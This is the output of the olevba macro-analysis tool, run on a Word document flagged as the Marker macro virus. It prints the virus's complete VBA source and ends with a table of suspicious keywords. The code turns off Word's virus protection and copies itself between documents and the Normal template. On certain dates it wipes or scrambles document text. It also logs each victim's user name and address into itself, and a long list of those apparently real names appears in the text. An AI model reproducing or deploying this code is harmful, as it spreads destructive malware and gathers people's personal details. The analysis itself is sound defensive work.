olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-199c1e6f7d4fdee77cfe2ecd2eb427b014e36ba3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-199c1e6f7d4fdee77cfe2ecd2eb427b014e36ba3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For i = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next i

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
            NT.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

            AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
            AD.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub

Private Sub Document_Open()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For i = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next i

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
            NT.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

            AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
            AD.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub
' 02:01:14 PM - Sunday, 16 May 1999
' USER5
'



' 10:14:21 AM - Monday, 17 May 1999
' Neelam Darne
'



' 09:22:49 PM - Saturday, 5 Jun 1999
' Mitesh Sanghani
'



' 11:40:33 AM - Friday, 11 Jun 1999
' Mitesh Sanghani
'



' 01:58:41 PM - Friday, 11 Jun 1999
' Administrator
'



' 11:53:17 dop. - ètvrtek, 1 VII 1999
' down
'



' 10:22:59 PM - Saturday, 3 Jul 1999
' 98a27
'



' 09:10:00 PM - Tuesday, 13 Jul 1999
' mahesh
'



' 06:48:24 PM - Tuesday, 20 Jul 1999
' mahesh
'



' 11:17:30 PM - Monday, 26 Jul 1999
' jeeny
'



' 11:24:24 PM - Sunday, 15 Aug 1999
' jeeny
'



' 10:52:01 PM - Friday, 17 Sep 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 08:22:58 PM - Tuesday, 28 Sep 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:27:22 PM - Wednesday, 20 Oct 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 09:40:24 AM - Monday, 25 Oct 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:12:02 PM - Thursday, 11 Nov 1999
' Shirin Gholap
'



' 10:07:35 AM - Tuesday, 16 Nov 1999
' Kate Kettler
'



' 11:10:25 PM - Wednesday, 17 Nov 1999
' Clifton Hostel
'



' 04:15:05 PM - Sunday, 19 Nov 2000
' 0340
' vivek vigOnchu Namgyal
' Woodstock



' 02:45:28 PM - Monday, 22 Nov 1999
' Student (generic)
'



' 06:49:35 PM - Thursday, 25 Nov 1999
' Dorms
'



' 10:38:14 PM - Thursday, 25 Nov 1999
' Information Systems
'



' 09:36:55 AM - Tuesday, 15 Feb 2000
' Student (generic)
'



' 07:56:16 PM - Tuesday, 29 Feb 2000
' 0400
'



' 08:57:09 PM - Thursday, 30 Mar 2000
' 0400
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

